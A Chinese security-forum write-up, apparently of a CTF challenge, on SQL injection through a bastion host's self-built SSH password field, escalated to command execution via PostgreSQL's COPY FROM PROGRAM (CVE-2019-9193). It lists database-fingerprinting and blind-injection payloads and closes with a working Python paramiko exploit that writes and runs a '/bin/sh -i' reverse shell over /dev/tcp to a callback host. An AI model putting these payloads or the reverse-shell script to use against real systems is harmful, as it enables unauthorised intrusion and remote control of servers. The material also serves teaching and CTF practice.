# Realworld下的堡垒机SQL RCE漏洞-先知社区

> **来源**: https://xz.aliyun.com/news/17048  
> **文章ID**: 17048

---

### 引言

堡垒机（Bastion Host），也称为跳板机或运维安全审计系统，是一种用于管理和控制对内部网络资源访问的安全设备。它的主要作用是作为运维人员访问内部服务器和网络设备的唯一入口，通过集中化的身份认证、权限管理和操作审计，确保运维操作的安全性和可追溯性。

### Realworld下的堡垒机SQL RCE漏洞

网站⼊⼝是⼀个 nginx ，但是这⾥⾯啥都没有。根据题⽬名字Jump Server，可以联想到题⽬可能跟堡垒机相关，可以扫描22端⼝以及3389端⼝  
![5b12ad12d95991c84556c9cf81926189.png](images/938a2e51-dcfb-3579-ba98-0a7f50c0e448)  
因为⼤多数堡垒都是可以通过ssh/rdp端⼝来访问和管理服务器，很多⼚商ssh/rdp都是⾃⼰写代码实现的，所以难免会出现漏洞。

连接题⽬的22端⼝，看到ssh banner，猜测这个ssh server⼤概率是⾃⼰实现的。

### 判断数据库类型: PostgreSQL

根据*端口*判断

```
Oracle：默认端口1521
SQL Server：默认端口1433
MySQL：默认端口3306
```

根据数据库*特有函数*来判断

* len和length

```
len()：SQL Server 、MySQL以及db2返回长度的函数。
length()：Oracle和INFORMIX返回长度的函数。
```

* version和@@version

```
version()：MySQL查询版本信息的函数
@@version：MySQL和SQL Server查询版本信息的函数
```

* substring和substr

```
MySQL两个函数都可以使用
Oracle只可调用substr
SQL Server只可调用substring
```

根据*特殊符号*进行判断

```
/*是MySQL数据库的注释符
--是Oracle和SQL Server支持的注释符
;是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库
#是MySQL中的注释符，返回错误则说明可能不是MySQL，另外也支持-- 和/**/
```

根据数据库*对字符串的处理方式*判断  
MySQL

```
http://127.0.0.1/test.php?id=1 and 'a'+'b'='ab' 
http://127.0.0.1/test.php?id=1 and CONCAT('a','b')='ab' 
```

Oracle

```
http://127.0.0.1/test.php?id=1 and 'a'||'b'='ab' 
http://127.0.0.1/test.php?id=1 and CONCAT('a','b')='ab' 
```

SQL Server

```
http://127.0.0.1/test.php?id=1 and 'a'+'b'='ab' 
```

根据数据库*特有的数据表*来判断  
MySQL（version>5.0）

```
http://127.0.0.1/test.php?id=1 and (select count(*) from information_schema.TABLES)>0 and 1=1
```

Oracle

```
 http://127.0.0.1/test.php?id=1 and (select count(*) from sys.user_tables)>0 and 1=1
```

SQL Server

```
 http://127.0.0.1/test.php?id=1 and (select count(*) from sysobjects)>0 and 1=1
```

根据盲注特别函数判断

```
MySQL
BENCHMARK(1000000,ENCODE('QWE','ASD'))
SLEEP(5)

PostgreSQL
PG_SLEEP(5)
GENERATE_SERIES(1,1000000)

SQL Server
WAITFOR DELAY '0:0:5'

sqlite 没有 `sleep()` 函数，但是有个函数 `randomblob(N)`
```

如果服务器响应时间随着有效负载而增加了明显的时间（大约20秒），则意味着应用程序容易受到攻击。

如果parameter是整数：  
`pg_sleep(20); -- -`

如果参数是字符串：  
`'||pg_sleep(20); -- -`

### PostgreSQL sql注入方法简要总结

PostgreSQL( 读作 Post-Gres-Q-L)是一个功能非常强大的、源代码开放的客户/服务器关系型数据库管理系统（RDBMS）。采用类似MIT的许可协议，允许开发人员做任何事情，包括在开源或闭源产品中商用，其源代码是免费提供的。

#### readfile

读取文件：

```
select pg_read_file(filepath+filename);
```

#### getshell

PostgreSQL是一个功能强大对象关系数据库管理系统(ORDBMS)。由于9.3增加一个“**COPY TO/FROM PROGRAM**”功能。这个功能就是允许数据库的超级用户以及pg\_read\_server\_files组中的任何用户执行操作系统命令

**影响版本**: 9.3-11.2

执行删除你想用来保存命令输出但是可能存在的表，这一步可有可无

```
DROP TABLE IF EXISTS cmd_exec; 
```

创建用来保存命令输出的表

```
CREATE TABLE cmd_exec(cmd_output text);
```

通过 “COPY FROM PROGRAM”执行系统命令

```
COPY cmd_exec FROM PROGRAM 'id';
```

将结果显示出来

```
SELECT * FROM cmd_exec;
```

其实PGSQL RCE是一个CVE，参考：[（CVE-2019-9193）PostgreSQL 高权限命令执行漏洞 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/261361.html)

### PGSQL 手法

常见的函数查看一些基本信息：

```
 #查看版本信息
 SELECT version() 

 #查看用户
 SELECT user;
 SELECT current_user;
 SELECT session_user;
 SELECT usename FROM pg_user; #这里是usename不是username
 SELECT getpgusername();
 
 #查看当前数据库
 SELECT current_database()  
 CURRENT_SCHEMA()  查看当前数据库    sqlmap跑注入使用此函数。
```

#### 无回显盲注

猜解数据库长度

```
1 ;SELECT CASE WHEN (length(current_database())=6) THEN pg_sleep(3) ELSE pg_sleep(0) END  --+      
```

猜解数据库名称

```
2 ;SELECT CASE WHEN (COALESCE(ASCII(SUBSTR((CURRENT_SCHEMA()),0,1)),0) > 100) THEN pg_sleep(14) ELSE pg_sleep(0) END LIMIT 1--+   #\
```

#### 绕过引号的限制

可以在postgreSQL中使用标签，方法是将标签名称放在`$`符号之间：  
`SELECT $quote$test$quote$;`与`SELECT 'test';`

或者我们也可以在字符串拼接的时候采取CHR()函数:

```
SELECT CHR(65)||CHR(66)||CHR(67)||CHR(68)||CHR(69)||CHR(70)||CHR(71)||CHR(72);`等效于`SELECT 'ABCDEFGH';
```

#### postgresql下的if

对于postgresql是case when语句

```
select case when(expr1) then result1 else result2 end;
```

举个例子

```
select casr when(current_user='postgres') then pg_sleep(5) else pg_sleep(0) end;
```

### SQL to RCE

由于PgSQL版本存在CVE-2019-9193可以堆叠注入RCE

创建用来保存命令输出的表

```
CREATE TABLE cmd_exec(cmd_output text);
```

通过 “COPY FROM PROGRAM”执行系统命令

```
COPY cmd_exec FROM PROGRAM 'id';
```

完整ssh交互python脚本如下：  
由于有ssh密码长度限制，所以需要分段写入文件最后再执行

```
import paramiko
def ssh_login(hostname, port, username, password):
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(hostname, port, username, password, allow_agent=False, look_for_keys=False)
        print("done")
        ssh_client.close()
    except Exception as e:
        print(e)
def exec_command(hostname, port, cmd):
    password = "';COPY s FROM PROGRAM '{}';--".format(cmd)
    print(password)
    if len(password) > 64:
        print("⻓度超⻓: {}".format(len(password)))
    ssh_login(hostname, port, "root", password)
if __name__ == "__main__":
    hostname = "114.55.146.242"
    port = 22
    username = "root"
    password = "-1';CREATE TABLE s(a text);--"
    ssh_login(hostname, port, username, password)
    cmd="echo -n "/bin/sh -i >" > /tmp/1.sh"
    exec_command(hostname, port, cmd)
    cmd="echo -n "& /dev/tcp/" >> /tmp/1.sh"
    exec_command(hostname, port, cmd)
    cmd="echo -n "ip." >> /tmp/1.sh"
    exec_command(hostname, port, cmd)
    cmd="echo -n "ip/4444 0>&1" >> /tmp/1.sh"
    exec_command(hostname, port, cmd)
    cmd="chmod +x /tmp/1.sh"
    exec_command(hostname, port, cmd)
    cmd="bash -c /tmp/1.sh"
    exec_command(hostname, port, cmd)
```

成功命令执行反弹shell  
![f98bca7f8645b54b1fc1b760673ddb65.png](images/3f6b2728-4434-311c-bba6-5bc21310404e)
